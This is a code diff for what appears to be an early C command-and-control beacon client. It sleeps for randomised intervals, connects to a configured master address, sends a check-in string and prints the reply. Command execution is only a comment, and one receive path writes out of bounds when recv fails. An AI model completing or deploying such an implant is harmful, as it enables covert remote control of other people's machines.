@@ -4,10 +4,13 @@
 
 int main(int argc, char **argv){
     struct sockaddr_in master;
+    master_init(&master);
     while ( 1 ) {
-        int sleep_time = (rand() % 3600) + 300;
         #ifdef CLIENT_DEBUG
+            int sleep_time = (rand() % 2) + 3;
             printf("Sleeping for %d seconds... ",sleep_time);
+        #else
+            int sleep_time = (rand() % 3600) + 300;
         #endif
 
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
@@ -25,7 +28,7 @@ int main(int argc, char **argv){
         // if command
             // run command
             // save results to be sent back on next beacon
-
+        master_checkin(master, "what the flying fuck?");
     }
     return 0;
 }
@@ -33,13 +36,13 @@ int main(int argc, char **argv){
 /*
  * Initalize connection
  */
-int master_init(struct sockaddr_in master) {
+int master_init(struct sockaddr_in *master) {
 
     #if defined __apple__ || defined(__linux__) || defined(__unix__)
-        memset(&master, 0, sizeof(master));
-        master.sin_family = AF_INET;
-        master.sin_addr.s_addr = inet_addr( MASTER_IP );
-        master.sin_port = MASTER_PORT;
+        memset(master, 0, sizeof(struct sockaddr_in));
+        master->sin_family = AF_INET;
+        master->sin_addr.s_addr = inet_addr( MASTER_IP );
+        master->sin_port = htons(MASTER_PORT);
     #elif __windows__
 
     #endif
@@ -47,7 +50,8 @@ int master_init(struct sockaddr_in master) {
 }
 
 int master_checkin(struct sockaddr_in master, char *data){
-
+    char server_reply[2000];
+    int recv_size;
     #if defined __apple__ || defined(__linux__) || defined(__unix__)
         // do standard sockets
         int s;
@@ -61,9 +65,26 @@ int master_checkin(struct sockaddr_in master, char *data){
         if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
             #ifdef CLIENT_DEBUG
                 printf("[master_checkin] Connect to master failed.");
+                perror("wut");
             #endif
             return -1;
         }
+        // Send data
+        if(send(s , data , strlen(data) , 0) < 0)
+        {
+            return -1; //something failed :(
+        }
+        //Receive a reply from the server
+        if((recv_size = recv(s , server_reply , 2000 , 0)) < 0)
+        {
+            puts("recv failed");
+        }
+
+        puts("Reply received\n");
+
+        //Add a NULL terminating character to make it a proper string before printing
+        server_reply[recv_size] = '\0';
+        puts(server_reply);
     #elif __windows__
         WSADATA wsa;
         SOCKET s;
@@ -100,7 +121,7 @@ int master_checkin(struct sockaddr_in master, char *data){
         }
 
         // Send data
-        if( send(s , data , strlen(data) , 0) < 0)
+        if( send(s , data , strlen(data) , 0) == SOCKET_ERROR)
         {
             return -1; //something failed :(
         }
